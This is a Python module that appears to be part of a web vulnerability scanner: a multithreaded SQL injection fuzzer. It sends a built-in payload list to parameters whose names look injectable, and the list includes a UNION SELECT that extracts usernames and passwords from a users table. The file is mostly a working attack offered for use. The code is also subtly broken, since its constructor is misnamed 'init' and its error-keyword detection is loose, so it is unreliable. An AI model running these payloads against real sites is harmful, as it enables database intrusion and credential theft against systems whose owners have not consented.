from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import requests

class SQLi:
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' UNION SELECT NULL, username, password FROM users --",
        "' AND 1=2 --",
        "' OR 1=1#",
        '" OR ""="',
        "' OR 1=1/*"
    ]

    def init(self, session, threads=5):
        self.session = session
        self.threads = threads
        self.indicators = ['error', 'mysql', 'sql', 'syntax']

    def filter_targets(self, targets):
        sqli_targets = []
        for target in targets:
            for param in target.get('params', []):
                if any(kw in param['name'].lower() for kw in ['id', 'user', 'name', 'query']):
                    sqli_targets.append(target)
                    break
        return sqli_targets

    def test_target(self, target):
        results = []
        for param in target['params']:
            for payload in self.payloads:
                try:
                    if param['type'] == 'GET':
                        req = self.session.get(
                            target['url'],
                            params={param['name']: payload},
                            timeout=7
                        )
                    else:
                        req = self.session.request(
                            param['type'],
                            target['url'],
                            data={param['name']: payload},
                            timeout=7
                        )
                    
                    if req.status_code == 200 and self.detect_vulnerability(req):
                        results.append({
                            'type': 'SQLi',
                            'url': req.url,
                            'param': param['name'],
                            'payload': payload,
                            'status': req.status_code,
                            'length': len(req.content),
                            'source': target['source']
                        })
                except Exception as e:
                    continue
        return results

    def detect_vulnerability(self, response):
        content = response.text.lower()
        return any(ind.lower() in content for ind in self.indicators)

    def fuzz(self, targets):
        filtered = self.filter_targets(targets)
        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for SQLi{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_target, t) for t in filtered]
            return [r for future in futures for r in future.result() if r]